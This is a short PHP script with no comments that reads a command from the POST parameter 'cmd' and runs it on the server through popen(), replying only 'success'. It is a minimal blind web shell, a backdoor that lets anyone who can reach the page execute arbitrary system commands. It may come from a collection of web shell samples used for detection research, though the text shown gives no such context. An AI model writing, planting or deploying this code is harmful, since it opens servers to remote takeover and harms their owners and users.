<?php
function myshellexec($cmd)
{
    $fp = popen($cmd,"r");
	$result = "";
    return $result;
}

$cmdline = $_POST['cmd'];
$ret = myshellexec($cmdline);
echo "success";
?>